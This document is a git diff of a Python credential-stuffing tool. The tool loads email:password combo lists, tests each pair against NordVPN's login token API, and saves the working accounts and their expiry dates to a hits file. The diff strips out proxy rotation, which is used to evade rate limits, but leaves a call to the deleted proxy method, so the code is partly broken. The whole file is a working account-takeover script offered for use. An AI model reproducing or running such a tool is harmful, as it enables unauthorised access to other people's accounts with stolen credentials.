@@ -54,13 +54,6 @@ class NordVPN:
         account_list = self.__read(self.data['combo_dir'], 'r')
         return account_list
 
-    def __get_proxy(self, proxy_type, direct):
-        proxy_list = self.__read(self.data['proxy_dir'], 'r')
-        use_proxy = True 
-        proxies = {'http': '%s://%s' % (self.data['proxy_type'], random.choice(proxy_list))}
-        
-        return proxies
-
     def custom_message(self, arg):
         self.custom = arg 
 
@@ -87,38 +80,6 @@ class NordVPN:
     \t\t\t\t         ▐       █   █             █     ▐  █    ▐
     \t\t\t\t                ▐   ▐             ▐        ▐                                           
             {Style.RESET_ALL}''')
-    
-
-
-    def user_proxy(self):
-        self.data['use_proxy'] = True
-
-        print(f'[{Fore.CYAN}>{Style.RESET_ALL}] Please choose choose proxy text file. ')
-
-        proxy_dir = filedialog.askopenfilename()
-        self.data['proxy_dir'] = proxy_dir
-
-        try:
-            proxy_type = int(input(f' HTTPS[{Fore.CYAN}0{Style.RESET_ALL}]\n SOCKS4[{Fore.CYAN}1{Style.RESET_ALL}]\n SOCKS5[{Fore.CYAN}2{Style.RESET_ALL}]\n > '))
-        
-        except ValueError:
-            print(f'[{Fore.CYAN}>{Style.RESET_ALL}] Value error! Please choose 0, 1, or 2!')
-            time.sleep(3)            
-            self.user_proxy()
-
-        if proxy_type == 0:
-            self.data['proxy_type'] = 'https'
-                           
-        elif proxy_type == 1:
-            self.data['proxy_type'] = 'socks4'
-
-        elif proxy_type== 2:
-            self.data['proxy_type'] = 'socks5'
-
-        else:
-            print(f'[{Fore.CYAN}!{Style.RESET_ALL}] Please choose a valid int such as 0, 1, or 2!')
-            time.sleep(3)
-            self.user_proxy()
 
     def user_combo(self):
         combo_dir = filedialog.askopenfilename()
@@ -136,7 +97,10 @@ class NordVPN:
 
     def checker(self, email, password):
         url = 'https://api.nordvpn.com/v1/users/tokens'
-        data = {'username': email, 'password': password}
+        data = {
+                "username": email,
+                "password": password
+               }
 
         if self.data['use_proxy']:
             proxies = self.__get_proxy(self.data['proxy_type'], self.data['proxy_dir'])
@@ -151,8 +115,7 @@ class NordVPN:
 
                 if 'user_id' in r.text:
                     expiry = r.json()['expires_at']
-                    free_print(f'[*] {Fore.CYAN}HIT{Style.RESET_ALL} | {email}:{password} | expires_at : {expiry}')
-                    with open('output/raw_hits.txt', 'a', encoding = 'UTF-8') as f: f.write('%s:%s\n' % (email, password))
+                    free_print(f'[*] {Fore.CYAN}HIT{Style.RESET_ALL} | {email}:{password}')
                     with open('output/hits.txt', 'a', encoding = 'UTF-8') as f: f.write('%s:%s | Expiry Date: %s %s\n' %(email, password, expiry, self.custom))
 
                 if 'Too Many Requests' in r.text:
@@ -220,11 +183,6 @@ def main():
         print(f'[{Fore.CYAN}>{Style.RESET_ALL}] This message will be added to the text file if it is a hit.')
         custom_message = input(f'[{Fore.CYAN}>{Style.RESET_ALL}] Add: ')
         n.custom_message(custom_message)
-    
-    use_proxy = input(f'[{Fore.CYAN}>{Style.RESET_ALL}] Use proxy? y/n > ')
-
-    if use_proxy == 'y':
-        n.user_proxy()
 
     print(f'[{Fore.CYAN}>{Style.RESET_ALL}] Please choose combo list text file. (email:pass)')
 
